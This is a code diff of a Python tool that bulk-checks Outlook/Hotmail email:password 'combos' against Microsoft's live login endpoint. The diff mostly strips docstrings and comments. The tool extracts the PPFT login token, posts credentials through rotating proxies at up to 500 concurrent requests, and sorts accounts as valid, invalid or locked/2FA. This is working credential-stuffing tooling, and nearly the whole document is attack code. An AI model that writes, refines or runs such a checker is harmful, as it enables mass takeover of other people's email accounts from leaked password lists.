@@ -1,11 +1,6 @@
-"""
-Outlook/Hotmail Account Checker (email:pass)
-Uses login.live.com POST flow with PPFT token extraction.
-"""
 import asyncio
 import re
 import time
-import random
 from datetime import datetime
 from typing import Optional, Dict, Any
 
@@ -15,10 +10,6 @@ import config
 
 
 class OutlookChecker:
-    """
-    Handles single email:pass verification against Microsoft's login endpoint.
-    """
-
     LOGIN_URL = "https://login.live.com/login.srf"
     POST_URL = "https://login.live.com/ppsecure/post.srf"
     USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
@@ -27,7 +18,6 @@ class OutlookChecker:
         self.timeout = timeout
 
     async def _get_ppft(self, proxy_url: Optional[str] = None) -> Optional[str]:
-        """Fetch PPFT token from login page."""
         connector = ProxyConnector.from_url(proxy_url) if proxy_url else None
         async with aiohttp.ClientSession(connector=connector) as session:
             try:
@@ -48,30 +38,15 @@ class OutlookChecker:
                     timeout=self.timeout,
                 ) as resp:
                     text = await resp.text()
-                    # Extract PPFT value from hidden input
-                    match = re.search(
-                        r'<input[^>]*name="PPFT"[^>]*value="([^"]+)"',
-                        text,
-                        re.IGNORECASE,
-                    )
+                    match = re.search(r'<input[^>]*name="PPFT"[^>]*value="([^"]+)"', text, re.IGNORECASE)
                     if match:
                         return match.group(1)
-                    # Fallback
-                    match2 = re.search(
-                        r'name="PPFT"[^>]*value="([^"]+)"', text, re.IGNORECASE
-                    )
+                    match2 = re.search(r'name="PPFT"[^>]*value="([^"]+)"', text, re.IGNORECASE)
                     return match2.group(1) if match2 else None
             except Exception:
                 return None
 
-    async def check(
-        self, email: str, password: str, proxy_url: Optional[str] = None
-    ) -> Dict[str, Any]:
-        """
-        Check a single email:pass combination.
-        Returns dict with keys: email, password, status, detail, checked_at.
-        Statuses: Valid, Invalid, Locked/2FA, Retry, Timeout, Error.
-        """
+    async def check(self, email: str, password: str, proxy_url: Optional[str] = None) -> Dict[str, Any]:
         result = {
             "email": email,
             "password": password,
@@ -80,32 +55,22 @@ class OutlookChecker:
             "checked_at": datetime.utcnow().isoformat(),
         }
 
-        # Basic format
         if "@" not in email or not password:
             result["status"] = "Invalid"
             result["detail"] = "Malformed email or missing password"
             return result
 
-        # Step 1: Get PPFT token
         ppft = await self._get_ppft(proxy_url)
         if not ppft:
             result["status"] = "Retry"
             result["detail"] = "Failed to get login token (proxy issue?)"
             return result
 
-        # Step 2: Perform login POST
         connector = ProxyConnector.from_url(proxy_url) if proxy_url else None
         async with aiohttp.ClientSession(connector=connector) as session:
             try:
-                data = {
-                    "login": email,
-                    "passwd": password,
-                    "PPFT": ppft,
-                }
-                headers = {
-                    "User-Agent": self.USER_AGENT,
-                    "Content-Type": "application/x-www-form-urlencoded",
-                }
+                data = {"login": email, "passwd": password, "PPFT": ppft}
+                headers = {"User-Agent": self.USER_AGENT, "Content-Type": "application/x-www-form-urlencoded"}
                 async with session.post(
                     self.POST_URL,
                     data=data,
@@ -116,7 +81,6 @@ class OutlookChecker:
                     text = await resp.text()
                     final_url = str(resp.url)
 
-                    # ─── Classification ───
                     if "outlook.live.com" in final_url or "login.live.com?cobrandid" in final_url:
                         result["status"] = "Valid"
                         result["detail"] = "Login successful"
@@ -127,8 +91,7 @@ class OutlookChecker:
                         or "two-factor" in text.lower()
                         or "E_Blocked" in text
                         or "E_Multi" in text
-                        or "verification" in text.lower()
-                        and "security" in text.lower()
+                        or ("verification" in text.lower() and "security" in text.lower())
                     ):
                         result["status"] = "Locked/2FA"
                         result["detail"] = "Account locked or requires 2FA"
@@ -136,8 +99,7 @@ class OutlookChecker:
 
                     if (
                         "password you entered is incorrect" in text.lower()
-                        or "sign in to" in text.lower()
-                        and "password" in text.lower()
+                        or ("sign in to" in text.lower() and "password" in text.lower())
                         or "E_Password" in text
                         or "wrong password" in text.lower()
                     ):
@@ -159,17 +121,7 @@ class OutlookChecker:
 
 
 class BulkChecker:
-    """
-    Orchestrates bulk email:pass checking with dynamic concurrency,
-    proxy rotation, and live progress reporting.
-    """
-
-    def __init__(
-        self,
-        proxy_manager,
-        concurrency: int = 500,
-        progress_callback=None,
-    ):
+    def __init__(self, proxy_manager, concurrency: int = 500, progress_callback=None):
         self.proxy_manager = proxy_manager
         self.concurrency = concurrency
         self.progress_callback = progress_callback
@@ -181,8 +133,7 @@ class BulkChecker:
 
     async def run(self, combos: list) -> list:
         total = len(combos)
-        processed = 0
-        valid = invalid = locked = retry = timeout = 0
+        processed = valid = invalid = locked = retry = timeout = 0
         results = []
         start_time = asyncio.get_event_loop().time()
 
@@ -232,9 +183,7 @@ class BulkChecker:
                     elif status == "Timeout":
                         timeout += 1
 
-                    if self.progress_callback and (
-                        processed % max(1, total // 20) == 0 or processed == total
-                    ):
+                    if self.progress_callback and (processed % max(1, total // 20) == 0 or processed == total):
                         elapsed = asyncio.get_event_loop().time() - start_time
                         speed = (processed / elapsed) * 60 if elapsed > 0 else 0
                         await self.progress_callback(
